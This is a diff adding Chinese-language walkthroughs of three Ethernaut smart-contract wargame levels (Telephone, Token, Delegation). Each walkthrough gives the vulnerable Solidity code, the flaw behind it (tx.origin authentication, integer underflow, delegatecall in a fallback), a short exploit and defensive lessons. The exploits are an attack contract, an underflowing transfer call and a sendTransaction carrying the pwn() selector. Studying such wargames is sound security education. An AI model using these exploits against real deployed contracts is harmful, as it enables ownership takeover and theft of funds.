@@ -274,3 +274,142 @@ contract CoinFlip {
   2. 执行10次`dosome()`函数
   3. 通关
   ![](../images/ethernaut/e03/01.png)
+
+## 04 Telephone
+此题考查`tx.origin`和`msg.sender`的区别。没有什么难点
+先看代码
+```
+pragma solidity ^0.6.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+```
+题目要求获得合约所有权，可以看到只要满足`tx.origin != msg.sender`就行。在此介绍一下`tx.origin`：
+>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。
+
+**在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。**<br/>
+因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。
+>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A->C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A->B->C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者
+
+* 漏洞分析
+  在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：
+  ```
+  pragma solidity ^0.6.0;
+
+  interface Telephone {
+      function changeOwner(address _owner) external;
+  }
+  contract Attack {
+      Telephone t;
+      constructor(address _adr) public{
+          t = Telephone(_adr);
+      }
+
+      function exp () public {
+          t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);
+      }
+  }
+  ```
+
+  * 总结：
+  tx.origin不应该用于智能合约的授权。更多的时候采用`msg.sender == owner`来进行判断。<br/>
+  但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用`require（tx.origin ==msg.sender）`来进行实现。
+
+  ## 05 Token
+  这是一个整数溢出的漏洞
+  先看代码：
+  ```
+  pragma solidity ^0.6.0;
+
+  contract Token {
+
+    mapping(address => uint) balances;
+    uint public totalSupply;
+
+    constructor(uint _initialSupply) public {
+      balances[msg.sender] = totalSupply = _initialSupply;
+    }
+
+    function transfer(address _to, uint _value) public returns (bool) {
+      require(balances[msg.sender] - _value >= 0);
+      balances[msg.sender] -= _value;
+      balances[_to] += _value;
+      return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint balance) {
+      return balances[_owner];
+    }
+  }
+  ```
+  不难发现，这个合约没有用到`SafeMath`那么我们就要格外关注是否存在整数溢出型的漏洞。
+  不出意外：在transfer方法中`require(balances[msg.sender] - _value >= 0)`使明显存在整数下溢的风险的。<br/>
+  由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，`_value>20`即可使`balances[msg.sender] - _value` 发生下溢变成一个很大的值从而符合判定条件。
+
+ * 解题思路
+  1. 在控制台调用transfer方法value为21即可
+  ![](../images/ethernaut/e05/01.png)
+  2. 此时查看我们的账户余额已经是一个相当大的值
+  ![](../images/ethernaut/e05/02.png)
+  3. 通关
+
+# 06 Delegation
+这道题考查对delegatecall()的认识
+非常危险
+先看代码：
+```
+pragma solidity ^0.6.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) public {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+```
+本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过`Delegation`合约调用`Delegate`中的`pwn()`函数，即可完成对`owner`的修改
+
+* 漏洞分析
+  我们注意到`Delegation`中的fallback()函数有`address(delegate).delegatecall(msg.data);`出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/>
+  我们在这道题当中只需要给`Delegation`合约转账，触发他的`fallback`函数并通过函数签名的方式传入`data`即可
+
+解题步骤：
+1. 执行`contract.sendTransaction({data:web3.utils.keccak256("pwn()").slice(0,10)});`给当前合约赚一笔帐并指定data
+![](../images/ethernaut/e06/01.png)
+2. 通关
